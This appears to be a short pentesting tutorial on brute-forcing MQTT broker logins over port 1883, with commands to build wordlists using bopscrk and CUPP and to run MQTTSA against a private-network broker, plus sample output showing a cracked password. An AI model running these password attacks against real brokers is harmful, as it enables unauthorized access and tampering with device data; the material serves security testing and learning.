### Brute Force MQTT

This only works with MQTT over 1883 (Which is by the way not recommended for secure implementations)
  
- Generate passwords to brute force
    - Option 1: Use [bopscrk (Before Outset PaSsword CRacKing)](https://github.com/r3nt0n/bopscrk)
        
        - Clone the repo
            ``` bash
            git clone https://github.com/r3nt0n/bopscrk.git
            ```
        - Change directory
            ``` bash
            cd bopscrk
            ```
        - Chreate a .txt file with passwords (python 3 required)
            ``` bash
            python3 bopscrk.py -w mikro,foo,raspberry,fab,password,1,12,123,1234,12345,123456,1234567,12345678,123456789
            ```

    - Option 2: Use [CUPP - Common User Passwords Profiler](https://github.com/Mebus/cupp) to generate passwords:
    
        - Clone the repo
            ``` bash
            git clone https://github.com/Mebus/cupp.git
            ```
        - Change directory
            ``` bash
            cd cupp
            ```
        - Create passwords (Python 3 required)
            ``` bash
            python3 cupp.py -i
            ```
        - Interactive questionsaire mode
            ``` bash

- Brute Force Client
    - Clone the [MQTTSA](https://github.com/stfbk/mqttsa) repo
        ``` bash
        git clone https://github.com/stfbk/mqttsa.git 
        ```
    - Change directory
        ``` bash
        cd mqttsa
        ```
    - Execute brute force on Broker:
        ``` bash
        python3 mqttsa.py 192.168.88.100 -p 1883 -u pubclient -w password.txt
        ```
    - Output - Our user:password (pubclient:mikrofoo123) was found. We could now publish data to the broker using these credentials
        ``` bash
        Performing brute force (press ctrl+c once to skip)
        trying: pubclient, mikro
        trying: pubclient, raspberry
        trying: pubclient, password
        trying: pubclient, mikrofoo123
        trying wildcard username: #
        Attempting the connection with: [pubclient,mikrofoo123]
        10 seconds connection timeout (press ctrl+c once to skip)
        Connected successfully using password found with brute force.
        ```
    - We also get a .pdf report lists all the information from our attack
